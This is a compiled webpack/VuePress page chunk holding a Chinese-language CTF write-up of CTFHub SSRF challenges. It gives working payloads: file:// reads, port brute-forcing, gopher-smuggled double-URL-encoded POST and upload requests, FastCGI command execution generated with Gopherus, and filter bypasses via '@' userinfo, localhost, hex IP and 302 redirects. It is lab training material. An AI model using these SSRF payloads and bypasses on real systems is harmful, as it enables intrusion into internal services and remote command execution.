{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[9],{767:function(t,s,a){\"use strict\";a.r(s);var e=a(1),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[a(\"h2\",{attrs:{id:\"内网访问\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#内网访问\"}},[t._v(\"#\")]),t._v(\" 内网访问\")]),t._v(\" \"),a(\"p\",[t._v(\"直接构造访问请求,获取flag\")]),t._v(\" \"),a(\"div\",{staticClass:\"language-url line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token path\"}},[a(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[t._v(\"/\")])]),a(\"span\",{pre:!0,attrs:{class:\"token query\"}},[a(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[t._v(\"?\")]),a(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[a(\"span\",{pre:!0,attrs:{class:\"token key\"}},[t._v(\"url\")]),t._v(\"=\"),a(\"span\",{pre:!0,attrs:{class:\"token value\"}},[t._v(\"127.0.0.1/flag.php\")])])]),t._v(\"\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"h2\",{attrs:{id:\"伪协议读取文件\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#伪协议读取文件\"}},[t._v(\"#\")]),t._v(\" 伪协议读取文件\")]),t._v(\" \"),a(\"p\",[t._v(\"根据题目提示使用file://协议，尝试一般web目录/var/www/html/\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/file.png\",alt:\"file\"}})]),t._v(\" \"),a(\"h2\",{attrs:{id:\"端口扫描\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#端口扫描\"}},[t._v(\"#\")]),t._v(\" 端口扫描\")]),t._v(\" \"),a(\"p\",[t._v(\"提示端口范围8000到9000\")]),t._v(\" \"),a(\"div\",{staticClass:\"language-url line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token path\"}},[a(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[t._v(\"/\")])]),a(\"span\",{pre:!0,attrs:{class:\"token query\"}},[a(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[t._v(\"?\")]),a(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[a(\"span\",{pre:!0,attrs:{class:\"token key\"}},[t._v(\"url\")]),t._v(\"=\"),a(\"span\",{pre:!0,attrs:{class:\"token value\"}},[t._v(\"127.0.0.1:8000\")])])]),t._v(\"\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"p\",[t._v(\"使用burpsuite对端口进行爆破，即可得到端口，访问获取flag\")]),t._v(\" \"),a(\"h2\",{attrs:{id:\"post请求\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#post请求\"}},[t._v(\"#\")]),t._v(\" POST请求\")]),t._v(\" \"),a(\"p\",[t._v(\"访问/?url=127.0.0.1/flag.ph,返回页面\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/post1.png\",alt:\"post1\"}}),a(\"br\"),t._v(\"\\n包含一个form和隐藏的key，推测需要在form中提交key，F12添加提交按钮\")]),t._v(\" \"),a(\"div\",{staticClass:\"language- line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[a(\"code\",[t._v('<input type=\"submit\" name=\"sbumit\">\\n')])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"p\",[a(\"img\",{attrs:{src:\"/assets/img/ctf/post3.png\",alt:\"post3\"}}),a(\"br\"),t._v('\\n在页面上提交key，页面返回\"Just View From 127.0.0.1\"'),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/post5.png\",alt:\"post5\"}}),a(\"br\"),t._v(\"\\n可见需要通过SSRF提交请求，构造POST请求\")]),t._v(\" \"),a(\"div\",{staticClass:\"language- line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[a(\"code\",[t._v(\"POST /flag.php HTTP/1.1\\nHost: 127.0.0.1:80\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: 36\\n\\nkey=99cb8729f8a7ba5dcaa367dc092c2f2c\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"6\")]),a(\"br\")])]),a(\"p\",[t._v(\"因为通过SSRF，需要进行两次请求，所以对请求数据进行2次url编码，注意使用CRLF，第一次url编码后需要将%0A替换为%0D%0A,最后得到请求数据\")]),t._v(\" \"),a(\"div\",{staticClass:\"language- line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[a(\"code\",[t._v(\"POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D99cb8729f8a7ba5dcaa367dc092c2f2c\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"p\",[t._v(\"使用gopher发送请求，gopher协议是SSRF中常用的一个协议：\")]),t._v(\" \"),a(\"div\",{staticClass:\"language-url line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token scheme\"}},[t._v(\"gopher\"),a(\"span\",{pre:!0,attrs:{class:\"token scheme-delimiter\"}},[t._v(\":\")])]),a(\"span\",{pre:!0,attrs:{class:\"token authority\"}},[a(\"span\",{pre:!0,attrs:{class:\"token authority-delimiter\"}},[t._v(\"//\")]),a(\"span\",{pre:!0,attrs:{class:\"token host\"}},[t._v(\"IP\")]),a(\"span\",{pre:!0,attrs:{class:\"token port-segment\"}},[a(\"span\",{pre:!0,attrs:{class:\"token port-delimiter\"}},[t._v(\":\")])])]),a(\"span\",{pre:!0,attrs:{class:\"token path\"}},[t._v(\"port\"),a(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[t._v(\"/\")]),t._v(\"_\")]),t._v(\"{TCP/IP数据流}\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"p\",[t._v(\"得到flag\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/post4.png\",alt:\"post4\"}})]),t._v(\" \"),a(\"h2\",{attrs:{id:\"文件上传\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#文件上传\"}},[t._v(\"#\")]),t._v(\" 文件上传\")]),t._v(\" \"),a(\"p\",[t._v(\"使用file协议查看flag.php，代码检查了上传ip和文件大小，所以需要从127.0.0.1上传非空文件\")]),t._v(\" \"),a(\"div\",{staticClass:\"language-php html line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token php language-php\"}},[a(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[t._v(\"<?php\")]),t._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"error_reporting\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"if\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$_SERVER\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),a(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"REMOTE_ADDR\"')]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"!=\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"127.0.0.1\"')]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),t._v(\"\\n    \"),a(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"echo\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"Just View From 127.0.0.1\"')]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \"),a(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"return\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"if\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),a(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"isset\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$_FILES\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),a(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"file\"')]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&&\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$_FILES\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),a(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"file\"')]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),a(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"size\"')]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),t._v(\"\\n    \"),a(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"echo\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"getenv\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),a(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"CTFHUB\"')]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n    \"),a(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"exit\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),t._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[t._v(\"?>\")])]),t._v(\"\\nUpload Webshell\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[a(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"form\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"action\")]),a(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation attr-equals\"}},[t._v(\"=\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"/flag.php\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"method\")]),a(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation attr-equals\"}},[t._v(\"=\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"post\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"enctype\")]),a(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation attr-equals\"}},[t._v(\"=\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"multipart/form-data\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n    \"),a(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[a(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"input\")]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"type\")]),a(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation attr-equals\"}},[t._v(\"=\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"file\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"name\")]),a(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation attr-equals\"}},[t._v(\"=\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"file\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[a(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"</\")]),t._v(\"form\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"7\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"8\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"9\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"10\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"11\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"12\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"13\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"14\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[t._v(\"15\")]),a(\"br\")])]),a(\"p\",[t._v(\"访问\"),a(\"code\",[t._v(\"/?url=127.0.0.1/flag.php\")]),t._v(\"，返回一个文件上传form，根据题意需要提交文件获取flag，F12添加提交按钮\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/upload1.png\",alt:\"upload1\"}}),a(\"br\"),t._v(\"\\n提交一个随意非空文件，抓取上传数据包，修改host为127.0.0.1:80\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/upload2.png\",alt:\"upload2\"}}),a(\"br\"),t._v(\"\\n对上传数据进行二次url编码，注意第一次编码后将%0A替换为%0D%0A，得到编码后的请求数据\")]),t._v(\" \"),a(\"div\",{staticClass:\"language- line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[a(\"code\",[t._v(\"POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520280%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F92.0.4515.159%2520Safari%252F537.36%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250ACookie%253A%2520UM_distinctid%253D17b2f471020f2e-06f3628e7e7e6e-4343363-1fa400-17b2f47102110f5%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522123.txt%2522%250D%250AContent-Type%253A%2520text%252Fplain%250D%250A%250D%250A123%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522123%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa--\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"p\",[t._v(\"使用gopher发送请求，得到flag\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/upload3.png\",alt:\"upload3\"}})]),t._v(\" \"),a(\"h2\",{attrs:{id:\"fastcgi协议\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#fastcgi协议\"}},[t._v(\"#\")]),t._v(\" FastCGI协议\")]),t._v(\" \"),a(\"p\",[a(\"a\",{attrs:{href:\"https://blog.csdn.net/mysteryflower/article/details/94386461\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"fastcgi相关介绍\"),a(\"OutboundLink\")],1),a(\"br\"),t._v(\" \"),a(\"a\",{attrs:{href:\"https://github.com/tarunkant/Gopherus\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"gopher payload工具\"),a(\"OutboundLink\")],1),a(\"br\"),t._v(\"\\n使用gopher工具生成payload，运行命令\"),a(\"code\",[t._v(\"ls /\")]),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/fastcgi1.png\",alt:\"fastcgi1\"}}),a(\"br\"),t._v(\"\\n发送请求，获取\"),a(\"code\",[t._v(\"/\")]),t._v(\"下目录情况,发现flag文件\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/fastcgi2.png\",alt:\"fastcgi2\"}}),a(\"br\"),t._v(\"\\n使用gopher工具生成payload，运行命令\"),a(\"code\",[t._v(\"cat /flag_14e0ba551d369f7992793e0b62395dc5\")]),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/fastcgi3.png\",alt:\"fastcgi3\"}}),a(\"br\"),t._v(\"\\n发送请求，获得flag\"),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/fastcgi4.png\",alt:\"fastcgi4\"}})]),t._v(\" \"),a(\"h2\",{attrs:{id:\"url-bypasss\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#url-bypasss\"}},[t._v(\"#\")]),t._v(\" URL Bypasss\")]),t._v(\" \"),a(\"p\",[t._v('访问地址提示\"start with '),a(\"code\",[t._v(\"http://notfound.ctfhub.com\")]),t._v('\", 所以需要以'),a(\"code\",[t._v(\"http://notfound.ctfhub.com\")]),t._v(\"开头，构造访问url如下获取flag\")]),t._v(\" \"),a(\"div\",{staticClass:\"language-url line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token path\"}},[a(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[t._v(\"/\")])]),a(\"span\",{pre:!0,attrs:{class:\"token query\"}},[a(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[t._v(\"?\")]),a(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[a(\"span\",{pre:!0,attrs:{class:\"token key\"}},[t._v(\"url\")]),t._v(\"=\"),a(\"span\",{pre:!0,attrs:{class:\"token value\"}},[t._v(\"http://notfound.ctfhub.com@127.0.0.1/flag.php\")])])]),t._v(\"\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"h2\",{attrs:{id:\"数字ip-bypass\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#数字ip-bypass\"}},[t._v(\"#\")]),t._v(\" 数字IP Bypass\")]),t._v(\" \"),a(\"p\",[t._v(\"题目提示ban掉了127以及172.不能使用点分十进制的IP，但是又要访问127.0.0.1\")]),t._v(\" \"),a(\"ul\",[a(\"li\",[t._v(\"方法一：\"),a(\"br\"),t._v(\"\\n使用localhost代替127.0.0.1,构造请求url如下，获取flag\")])]),t._v(\" \"),a(\"div\",{staticClass:\"language-url line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token path\"}},[a(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[t._v(\"/\")])]),a(\"span\",{pre:!0,attrs:{class:\"token query\"}},[a(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[t._v(\"?\")]),a(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[a(\"span\",{pre:!0,attrs:{class:\"token key\"}},[t._v(\"url\")]),t._v(\"=\"),a(\"span\",{pre:!0,attrs:{class:\"token value\"}},[t._v(\"http://localhost/flag.php\")])])]),t._v(\"\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"ul\",[a(\"li\",[t._v(\"方法二:\"),a(\"br\"),t._v(\"\\n将127.0.0.1转换为16进制0x7F000001,构造请求url如下，获取flag\")])]),t._v(\" \"),a(\"div\",{staticClass:\"language-url line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-url\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token path\"}},[a(\"span\",{pre:!0,attrs:{class:\"token path-separator\"}},[t._v(\"/\")])]),a(\"span\",{pre:!0,attrs:{class:\"token query\"}},[a(\"span\",{pre:!0,attrs:{class:\"token query-delimiter\"}},[t._v(\"?\")]),a(\"span\",{pre:!0,attrs:{class:\"token pair\"}},[a(\"span\",{pre:!0,attrs:{class:\"token key\"}},[t._v(\"url\")]),t._v(\"=\"),a(\"span\",{pre:!0,attrs:{class:\"token value\"}},[t._v(\"http://0x7F000001/flag.php\")])])]),t._v(\"\\n\")])]),t._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[t._v(\"1\")]),a(\"br\")])]),a(\"h2\",{attrs:{id:\"_302跳转-bypass\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_302跳转-bypass\"}},[t._v(\"#\")]),t._v(\" 302跳转 Bypass\")]),t._v(\" \"),a(\"p\",[t._v(\"题目提示过滤了127.0.0.1，使用\"),a(\"a\",{attrs:{href:\"#%E6%95%B0%E5%AD%97ip-bypass\"}},[t._v(\"数字IP Bypass\")]),t._v(\"可以绕过，但是题意是使用302跳转绕过，可以生成短链接302跳转获得flag,  \"),a(\"a\",{attrs:{href:\"https://my5353.com/\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"短链接生成网站\"),a(\"OutboundLink\")],1),a(\"br\"),t._v(\" \"),a(\"img\",{attrs:{src:\"/assets/img/ctf/302.png\",alt:\"短链接访问\"}})])])}),[],!1,null,null,null);s.default=n.exports}}]);","extractedComments":[]}